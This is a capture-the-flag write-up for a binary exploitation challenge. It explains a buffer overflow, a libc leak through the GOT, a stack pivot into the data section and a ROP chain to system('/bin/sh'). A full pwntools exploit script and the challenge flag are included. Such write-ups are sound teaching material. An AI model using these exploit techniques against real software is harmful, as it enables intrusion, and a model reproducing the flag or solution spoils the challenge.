# Close the door

## Challenge

We have an interactive prompt where we can choose options to try to find a secret.
None of the advertised options lead to anywhere useful.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

By disassembling the `main` function, we see that there is a hidden path if we enter 42 as our second input, which is not a default option.
This will set `var_4h._0_4_ = 1;` which is passed to `hidden_func`, unlocking a new path:

```c
void sym.hidden_func(uint32_t arg1)
{
    uint32_t var_44h;
    void *buf;
    int64_t var_38h;
    int64_t var_30h;
    int64_t var_28h;
    int32_t var_20h;
    int32_t var_1ch;
    char *var_18h;
    int32_t var_ch;
    char *ptr;
    
    if (arg1 == 0) {
    // WARNING: Subroutine does not return
        sym.imp.exit(0x22);
    }
    ptr = "Do you think this is the secret password?\n> ";
    var_ch = sym.imp.strlen("Do you think this is the secret password?\n> ");
    var_18h = "At least we tried...\n";
    var_1ch = sym.imp.strlen("At least we tried...\n");
    var_20h = 0x464;
    buf = NULL;
    var_38h = 0;
    var_30h = 0;
    var_28h = 0;
    sym.imp.write(1, ptr, (int64_t)var_ch);
    sym.imp.read(0, &buf, (int64_t)var_20h);
    sym.imp.write(1, var_18h, (int64_t)var_1ch);
    if (_obj.check != 0) {
        sym.imp.fclose(_reloc.stdout);
        sym.imp.fclose(_reloc.stderr);
    }
    _obj.check = _obj.check + 1;
    return;
}
```

Here we have a very large buffer overflow.
We can also overflow variables before they are used in the call to `write`, which we can use to leak memory at an arbitrary address.
Lastly, we can change the return address to redirect code execution.
Note that if we jump directly back to this function, it will close stdout and stderr, preventing us from leaking more info, including the flag.

The variables it uses to track how many times we call the function are stored in the data section of the binary.
By pivoting the stack onto the binary, we can overwrite these variables using the buffer overflow before it checks if it should close stdout and stderr.
Using the first option, which reads 0xf bytes into another global variable, we can put useful gadgets on the stack for after the pivot, allowing us to execute the function again.

These variables are near the lower bound of the data section, so large call stacks will overflow into a non-writeable section and segfault.
To avoid this, we can use a lot of `ret` gadgets to move RSP to a greater address.
Now that we have a second overflow and have already leaked libc, we can call `system("/bin/sh\x00")` and spawn a shell.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 close_the_door
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('close_the_door')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

poprsi_popr15 = 0x0000000000400b51
poprdi = 0x0000000000400b53
ret = 0x0000000000400646
moveax_leave = 0x0000000000400ae0
companion = 0x00602060
data = 0x00602500
reset_check = 0x00400900
hidden_func = exe.sym["hidden_func"]

io.recvuntil("> ")
io.send(p64(reset_check) + p64(hidden_func)[:-1])

io.recvuntil("> ")
io.sendline("42")

payload = flat({
    0x40 - 0x1c: p32(8),
    0x40 - 0x18: exe.got["write"],
    0x40: companion,
    0x40 + 8: [
        moveax_leave,
        data,
        ],
    })

io.recvuntil("> ")
io.send(payload)

leak = io.recv(numb=8)
libc.address = u64(leak.ljust(8, b'\x00')) - libc.sym["write"]
print(hex(libc.address))

payload = flat({
    0x40 - 0x1c: p32(8),
    0x40 - 0x18: 0,
    0x40: companion,
    0x40 + 8: [
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        ret,
        poprdi,
        next(libc.search(b"/bin/sh\x00")),
        libc.sym["system"],
        ],
    })

io.recvuntil("> ")
pause()
io.send(payload)

io.interactive()
```

## Flag

`CHTB{f_cl0s3d_d00r5_w1ll_n0t_st0p_us}`

